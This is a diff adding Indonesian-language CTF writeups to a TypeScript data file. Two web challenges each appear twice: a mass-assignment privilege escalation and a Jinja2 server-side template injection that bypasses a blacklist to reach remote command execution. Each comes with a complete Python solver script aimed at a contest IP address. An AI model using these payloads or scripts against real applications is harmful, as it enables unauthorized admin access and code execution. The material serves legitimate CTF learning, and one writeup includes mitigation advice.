@@ -1,6 +1,6 @@
 import type { WriteUp } from '../types';
 
-// CitCTF — 15 writeups
+// Citctf — 19 writeups
 export const citctfWriteups: WriteUp[] = [
   {
     "id": "citctf-foren-larping101",
@@ -646,6 +646,198 @@ export const citctfWriteups: WriteUp[] = [
     ],
     "terminalOutputs": [],
     "flag": "CIT{W3ak_S3cr3t5_C@n_B3_Un5ign3d}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "citctf-web-amassiveproblem",
+    "title": "- A Massive Problem (Web Misc)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Citctf",
+    "tags": [],
+    "description": "Challenge ini terlihat seperti aplikasi internal biasa: ada register, login, dashboard, profile, dan panel admin.\nDeskripsi challenge bilang: *\"Improper Authorization has been fixed!\"*.\nDari judulnya (*A Massive Problem*), indikasi paling kuat adalah **mass assignment** masih ada.",
+    "problemDescription": "Endpoint `POST /api/profile` menerima JSON profile update dari user biasa.\nAplikasi seharusnya hanya mengizinkan field aman seperti:\n- `full_name`\n- `title`\n- `team`\n- opsional `password`\n\nTapi backend ternyata masih menerima field sensitif `role`.\nAkibatnya user biasa bisa kirim payload `{\"role\":\"admin\"}` dan naik privilege ke admin.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Informasi Target",
+        "content": "- URL: `http://23.179.17.92:5556`\n- Teknologi (dari header): `Werkzeug/3.1.8`, Python 3.12"
+      },
+      {
+        "title": "1. Register akun biasa",
+        "content": "Kirim request ke:\n- `POST /api/register`\n\nContoh payload:",
+        "code": "{\n  \"full_name\": \"Nata Test\",\n  \"username\": \"natauser\",\n  \"title\": \"Dev\",\n  \"team\": \"Ops\",\n  \"password\": \"Abcd1234!\"\n}"
+      },
+      {
+        "title": "2. Login akun tersebut",
+        "content": "Kirim request ke:\n- `POST /api/login`\n\nContoh payload:",
+        "code": "{\n  \"username\": \"natauser\",\n  \"password\": \"Abcd1234!\"\n}"
+      },
+      {
+        "title": "3. Abuse mass assignment di profile update",
+        "content": "Kirim request ke:\n- `POST /api/profile`\n\nPayload exploit:\n\n\n\nServer merespon sukses (`200`) dan minta login ulang.",
+        "code": "{\n  \"full_name\": \"Nata Test\",\n  \"title\": \"Dev\",\n  \"team\": \"Ops\",\n  \"role\": \"admin\"\n}"
+      },
+      {
+        "title": "4. Login ulang, akses `/admin`",
+        "content": "Setelah login ulang, dashboard menampilkan link Admin.\nAkses `/admin` dan flag muncul langsung di halaman."
+      },
+      {
+        "title": "Solver Otomatis",
+        "content": "Saya simpan solver di file:\n- `solve.py`\n\nJalankan dengan venv kamu:\n\n\n\nAtau pakai URL lain:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
+      },
+      {
+        "title": "Kenapa ini terjadi?",
+        "content": "Masalah inti: backend melakukan update model user dari body JSON tanpa allowlist field ketat.\nJadi field yang seharusnya internal (`role`) ikut ter-assign."
+      },
+      {
+        "title": "Mitigasi yang benar",
+        "content": "- Terapkan allowlist strict untuk field yang boleh diupdate user.\n- Jangan pernah ambil `role` dari input user biasa.\n- Pisahkan endpoint admin update privilege dari endpoint profile user.\n- Tambah test keamanan: pastikan user standar tidak bisa mengubah role sendiri."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport json\r\nimport random\r\nimport re\r\nimport string\r\nimport sys\r\nimport urllib.request\r\nimport urllib.error\r\nimport http.cookiejar\r\n\r\n\r\ndef rand_suffix(n=6):\r\n    alphabet = string.ascii_lowercase + string.digits\r\n    return ''.join(random.choice(alphabet) for _ in range(n))\r\n\r\n\r\ndef make_opener():\r\n    cj = http.cookiejar.CookieJar()\r\n    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\r\n\r\n\r\ndef post_json(opener, url, payload):\r\n    data = json.dumps(payload).encode()\r\n    req = urllib.request.Request(\r\n        url,\r\n        data=data,\r\n        headers={\"Content-Type\": \"application/json\"},\r\n        method=\"POST\",\r\n    )\r\n    with opener.open(req, timeout=10) as r:\r\n        body = r.read().decode(\"utf-8\", errors=\"ignore\")\r\n        code = r.getcode()\r\n    return code, body\r\n\r\n\r\ndef get(opener, url):\r\n    req = urllib.request.Request(url, method=\"GET\")\r\n    with opener.open(req, timeout=10) as r:\r\n        body = r.read().decode(\"utf-8\", errors=\"ignore\")\r\n        code = r.getcode()\r\n    return code, body\r\n\r\n\r\ndef main():\r\n    ap = argparse.ArgumentParser(description=\"Solve A Massive Problem (mass assignment privesc)\")\r\n    ap.add_argument(\"--url\", default=\"http://23.179.17.92:5556\", help=\"Base URL target\")\r\n    ap.add_argument(\"--password\", default=\"Abcd1234!\", help=\"Password untuk akun baru\")\r\n    args = ap.parse_args()\r\n\r\n    base = args.url.rstrip(\"/\")\r\n    opener = make_opener()\r\n\r\n    username = f\"nata_{rand_suffix()}\"\r\n    register_payload = {\r\n        \"full_name\": \"Nata Solver\",\r\n        \"username\": username,\r\n        \"title\": \"Dev\",\r\n        \"team\": \"Ops\",\r\n        \"password\": args.password,\r\n    }\r\n\r\n    # 1) Register user biasa\r\n    code, body = post_json(opener, f\"{base}/api/register\", register_payload)\r\n    if code != 200:\r\n        print(f\"[!] Register gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 2) Login user\r\n    code, body = post_json(opener, f\"{base}/api/login\", {\"username\": username, \"password\": args.password})\r\n    if code != 200:\r\n        print(f\"[!] Login awal gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 3) Mass assignment di /api/profile\r\n    #    role diubah jadi admin walau harusnya tidak boleh dari user biasa\r\n    profile_payload = {\r\n        \"full_name\": \"Nata Solver\",\r\n        \"title\": \"Dev\",\r\n        \"team\": \"Ops\",\r\n        \"role\": \"admin\",\r\n    }\r\n    code, body = post_json(opener, f\"{base}/api/profile\", profile_payload)\r\n    if code != 200:\r\n        print(f\"[!] Update profile gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 4) Login ulang (sesuai behavior aplikasi)\r\n    code, body = post_json(opener, f\"{base}/api/login\", {\"username\": username, \"password\": args.password})\r\n    if code != 200:\r\n        print(f\"[!] Login ulang gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 5) Akses admin dan ambil flag\r\n    code, html = get(opener, f\"{base}/admin\")\r\n    if code != 200:\r\n        print(f\"[!] /admin gagal diakses: HTTP {code}\")\r\n        sys.exit(1)\r\n\r\n    m = re.search(r\"CIT\\{[^}]+\\}\", html)\r\n    if not m:\r\n        print(\"[!] Flag tidak ditemukan di /admin\")\r\n        sys.exit(1)\r\n\r\n    flag = m.group(0)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "CIT{M@ss_@ssignm3nt_Pr1v3sc}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "citctf-web-temprorarydestruction",
+    "title": "Temporary Destruction",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Citctf",
+    "tags": [],
+    "description": "Challenge category: Web Misc  \nTarget: `http://23.179.17.92:5558`",
+    "problemDescription": "Aplikasi ini vulnerable ke **Server-Side Template Injection (SSTI)** di Jinja2.  \nInput user dirender sebagai template, sehingga ekspresi seperti `{{7*7}}` dieksekusi server.\n\nDari SSTI, saya escalate ke RCE dan baca file flag di server.\n\nFlag: `CIT{55T1_R3m0t3_C0d3_3x3cut1on}`",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Langkah Penyelesaian",
+        "content": "1. **Enumerasi awal**\n   - `GET /` menampilkan form dengan textarea `user_input`.\n   - Setelah submit, hasil ditampilkan di `<pre>...</pre>`.\n\n2. **Cek SSTI**\n   - Kirim payload:\n     \n   - Output menjadi `49`, artinya template dievaluasi di server (SSTI confirmed).\n\n3. **Uji jalur object traversal**\n   - Payload `{{url_for.__globals__}}` menghasilkan `rejected.` (ada blacklist sederhana).\n   - Bypass blacklist dilakukan dengan hex escape untuk karakter `_`:\n     \n   - Ini berhasil membuka akses ke global namespace Flask module.\n\n4. **RCE**\n   - Panggil `os.popen` dari globals:\n     \n   - Output valid (`uid=1000(ctf) ...`) => command execution berhasil.\n\n5. **Ambil flag**\n   - Enumerasi file cepat menemukan `/tmp/flag.txt`.\n   - Baca isi:\n     \n   - Flag didapat.",
+        "code": "{{7*7}}"
+      },
+      {
+        "title": "Solver",
+        "content": "File solver disimpan di: `solver.py`\n\nJalankan:\n\n\n\nAtau custom target:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solver.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport html\r\nimport re\r\n\r\nimport requests\r\n\r\n\r\ndef extract_pre(resp_text: str) -> str:\r\n    m = re.search(r\"<pre>(.*?)</pre>\", resp_text, re.S)\r\n    if not m:\r\n        return \"\"\r\n    return html.unescape(m.group(1))\r\n\r\n\r\ndef run_cmd(base_url: str, cmd: str, timeout: int = 15) -> str:\r\n    safe_cmd = cmd.replace(\"'\", \"'\\\"'\\\"'\")\r\n    payload = (\r\n        \"{{(url_for|attr('\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f'))['os'].\"\r\n        \"popen('\" + safe_cmd + \"').read()}}\"\r\n    )\r\n    r = requests.post(base_url, data={\"user_input\": payload}, timeout=timeout)\r\n    r.raise_for_status()\r\n    return extract_pre(r.text)\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Temporary Destruction solver (SSTI)\")\r\n    parser.add_argument(\r\n        \"-u\",\r\n        \"--url\",\r\n        default=\"http://23.179.17.92:5558/\",\r\n        help=\"Target URL (default: http://23.179.17.92:5558/)\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    url = args.url.rstrip(\"/\") + \"/\"\r\n\r\n    sanity = run_cmd(url, \"id\")\r\n    if \"uid=\" not in sanity:\r\n        raise RuntimeError(\"RCE check failed\")\r\n\r\n    flag = run_cmd(url, \"cat /tmp/flag.txt\")\r\n    print(flag.strip())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "CIT{55T1_R3m0t3_C0d3_3x3cut1on}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "citctf-web-amassiveproblem-a-massive-problem",
+    "title": "- A Massive Problem (Web Misc)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Citctf",
+    "tags": [],
+    "description": "Challenge ini terlihat seperti aplikasi internal biasa: ada register, login, dashboard, profile, dan panel admin.\nDeskripsi challenge bilang: *\"Improper Authorization has been fixed!\"*.\nDari judulnya (*A Massive Problem*), indikasi paling kuat adalah **mass assignment** masih ada.",
+    "problemDescription": "Endpoint `POST /api/profile` menerima JSON profile update dari user biasa.\nAplikasi seharusnya hanya mengizinkan field aman seperti:\n- `full_name`\n- `title`\n- `team`\n- opsional `password`\n\nTapi backend ternyata masih menerima field sensitif `role`.\nAkibatnya user biasa bisa kirim payload `{\"role\":\"admin\"}` dan naik privilege ke admin.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Informasi Target",
+        "content": "- URL: `http://23.179.17.92:5556`\n- Teknologi (dari header): `Werkzeug/3.1.8`, Python 3.12"
+      },
+      {
+        "title": "1. Register akun biasa",
+        "content": "Kirim request ke:\n- `POST /api/register`\n\nContoh payload:",
+        "code": "{\n  \"full_name\": \"Nata Test\",\n  \"username\": \"natauser\",\n  \"title\": \"Dev\",\n  \"team\": \"Ops\",\n  \"password\": \"Abcd1234!\"\n}"
+      },
+      {
+        "title": "2. Login akun tersebut",
+        "content": "Kirim request ke:\n- `POST /api/login`\n\nContoh payload:",
+        "code": "{\n  \"username\": \"natauser\",\n  \"password\": \"Abcd1234!\"\n}"
+      },
+      {
+        "title": "3. Abuse mass assignment di profile update",
+        "content": "Kirim request ke:\n- `POST /api/profile`\n\nPayload exploit:\n\n\n\nServer merespon sukses (`200`) dan minta login ulang.",
+        "code": "{\n  \"full_name\": \"Nata Test\",\n  \"title\": \"Dev\",\n  \"team\": \"Ops\",\n  \"role\": \"admin\"\n}"
+      },
+      {
+        "title": "4. Login ulang, akses `/admin`",
+        "content": "Setelah login ulang, dashboard menampilkan link Admin.\nAkses `/admin` dan flag muncul langsung di halaman."
+      },
+      {
+        "title": "Solver Otomatis",
+        "content": "Saya simpan solver di file:\n- `solve.py`\n\nJalankan dengan venv kamu:\n\n\n\nAtau pakai URL lain:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
+      },
+      {
+        "title": "Kenapa ini terjadi?",
+        "content": "Masalah inti: backend melakukan update model user dari body JSON tanpa allowlist field ketat.\nJadi field yang seharusnya internal (`role`) ikut ter-assign."
+      },
+      {
+        "title": "Mitigasi yang benar",
+        "content": "- Terapkan allowlist strict untuk field yang boleh diupdate user.\n- Jangan pernah ambil `role` dari input user biasa.\n- Pisahkan endpoint admin update privilege dari endpoint profile user.\n- Tambah test keamanan: pastikan user standar tidak bisa mengubah role sendiri."
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport json\r\nimport random\r\nimport re\r\nimport string\r\nimport sys\r\nimport urllib.request\r\nimport urllib.error\r\nimport http.cookiejar\r\n\r\n\r\ndef rand_suffix(n=6):\r\n    alphabet = string.ascii_lowercase + string.digits\r\n    return ''.join(random.choice(alphabet) for _ in range(n))\r\n\r\n\r\ndef make_opener():\r\n    cj = http.cookiejar.CookieJar()\r\n    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\r\n\r\n\r\ndef post_json(opener, url, payload):\r\n    data = json.dumps(payload).encode()\r\n    req = urllib.request.Request(\r\n        url,\r\n        data=data,\r\n        headers={\"Content-Type\": \"application/json\"},\r\n        method=\"POST\",\r\n    )\r\n    with opener.open(req, timeout=10) as r:\r\n        body = r.read().decode(\"utf-8\", errors=\"ignore\")\r\n        code = r.getcode()\r\n    return code, body\r\n\r\n\r\ndef get(opener, url):\r\n    req = urllib.request.Request(url, method=\"GET\")\r\n    with opener.open(req, timeout=10) as r:\r\n        body = r.read().decode(\"utf-8\", errors=\"ignore\")\r\n        code = r.getcode()\r\n    return code, body\r\n\r\n\r\ndef main():\r\n    ap = argparse.ArgumentParser(description=\"Solve A Massive Problem (mass assignment privesc)\")\r\n    ap.add_argument(\"--url\", default=\"http://23.179.17.92:5556\", help=\"Base URL target\")\r\n    ap.add_argument(\"--password\", default=\"Abcd1234!\", help=\"Password untuk akun baru\")\r\n    args = ap.parse_args()\r\n\r\n    base = args.url.rstrip(\"/\")\r\n    opener = make_opener()\r\n\r\n    username = f\"nata_{rand_suffix()}\"\r\n    register_payload = {\r\n        \"full_name\": \"Nata Solver\",\r\n        \"username\": username,\r\n        \"title\": \"Dev\",\r\n        \"team\": \"Ops\",\r\n        \"password\": args.password,\r\n    }\r\n\r\n    # 1) Register user biasa\r\n    code, body = post_json(opener, f\"{base}/api/register\", register_payload)\r\n    if code != 200:\r\n        print(f\"[!] Register gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 2) Login user\r\n    code, body = post_json(opener, f\"{base}/api/login\", {\"username\": username, \"password\": args.password})\r\n    if code != 200:\r\n        print(f\"[!] Login awal gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 3) Mass assignment di /api/profile\r\n    #    role diubah jadi admin walau harusnya tidak boleh dari user biasa\r\n    profile_payload = {\r\n        \"full_name\": \"Nata Solver\",\r\n        \"title\": \"Dev\",\r\n        \"team\": \"Ops\",\r\n        \"role\": \"admin\",\r\n    }\r\n    code, body = post_json(opener, f\"{base}/api/profile\", profile_payload)\r\n    if code != 200:\r\n        print(f\"[!] Update profile gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 4) Login ulang (sesuai behavior aplikasi)\r\n    code, body = post_json(opener, f\"{base}/api/login\", {\"username\": username, \"password\": args.password})\r\n    if code != 200:\r\n        print(f\"[!] Login ulang gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 5) Akses admin dan ambil flag\r\n    code, html = get(opener, f\"{base}/admin\")\r\n    if code != 200:\r\n        print(f\"[!] /admin gagal diakses: HTTP {code}\")\r\n        sys.exit(1)\r\n\r\n    m = re.search(r\"CIT\\{[^}]+\\}\", html)\r\n    if not m:\r\n        print(\"[!] Flag tidak ditemukan di /admin\")\r\n        sys.exit(1)\r\n\r\n    flag = m.group(0)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "CIT{M@ss_@ssignm3nt_Pr1v3sc}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "citctf-web-temprorarydestruction-temporary-destruction",
+    "title": "Temporary Destruction",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Citctf",
+    "tags": [],
+    "description": "Challenge category: Web Misc  \nTarget: `http://23.179.17.92:5558`",
+    "problemDescription": "Aplikasi ini vulnerable ke **Server-Side Template Injection (SSTI)** di Jinja2.  \nInput user dirender sebagai template, sehingga ekspresi seperti `{{7*7}}` dieksekusi server.\n\nDari SSTI, saya escalate ke RCE dan baca file flag di server.\n\nFlag: `CIT{55T1_R3m0t3_C0d3_3x3cut1on}`",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Langkah Penyelesaian",
+        "content": "1. **Enumerasi awal**\n   - `GET /` menampilkan form dengan textarea `user_input`.\n   - Setelah submit, hasil ditampilkan di `<pre>...</pre>`.\n\n2. **Cek SSTI**\n   - Kirim payload:\n     \n   - Output menjadi `49`, artinya template dievaluasi di server (SSTI confirmed).\n\n3. **Uji jalur object traversal**\n   - Payload `{{url_for.__globals__}}` menghasilkan `rejected.` (ada blacklist sederhana).\n   - Bypass blacklist dilakukan dengan hex escape untuk karakter `_`:\n     \n   - Ini berhasil membuka akses ke global namespace Flask module.\n\n4. **RCE**\n   - Panggil `os.popen` dari globals:\n     \n   - Output valid (`uid=1000(ctf) ...`) => command execution berhasil.\n\n5. **Ambil flag**\n   - Enumerasi file cepat menemukan `/tmp/flag.txt`.\n   - Baca isi:\n     \n   - Flag didapat.",
+        "code": "{{7*7}}"
+      },
+      {
+        "title": "Solver",
+        "content": "File solver disimpan di: `solver.py`\n\nJalankan:\n\n\n\nAtau custom target:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solver.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport html\r\nimport re\r\n\r\nimport requests\r\n\r\n\r\ndef extract_pre(resp_text: str) -> str:\r\n    m = re.search(r\"<pre>(.*?)</pre>\", resp_text, re.S)\r\n    if not m:\r\n        return \"\"\r\n    return html.unescape(m.group(1))\r\n\r\n\r\ndef run_cmd(base_url: str, cmd: str, timeout: int = 15) -> str:\r\n    safe_cmd = cmd.replace(\"'\", \"'\\\"'\\\"'\")\r\n    payload = (\r\n        \"{{(url_for|attr('\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f'))['os'].\"\r\n        \"popen('\" + safe_cmd + \"').read()}}\"\r\n    )\r\n    r = requests.post(base_url, data={\"user_input\": payload}, timeout=timeout)\r\n    r.raise_for_status()\r\n    return extract_pre(r.text)\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Temporary Destruction solver (SSTI)\")\r\n    parser.add_argument(\r\n        \"-u\",\r\n        \"--url\",\r\n        default=\"http://23.179.17.92:5558/\",\r\n        help=\"Target URL (default: http://23.179.17.92:5558/)\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    url = args.url.rstrip(\"/\") + \"/\"\r\n\r\n    sanity = run_cmd(url, \"id\")\r\n    if \"uid=\" not in sanity:\r\n        raise RuntimeError(\"RCE check failed\")\r\n\r\n    flag = run_cmd(url, \"cat /tmp/flag.txt\")\r\n    print(flag.strip())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "CIT{55T1_R3m0t3_C0d3_3x3cut1on}",
     "lessonsLearned": ""
   }
 ];
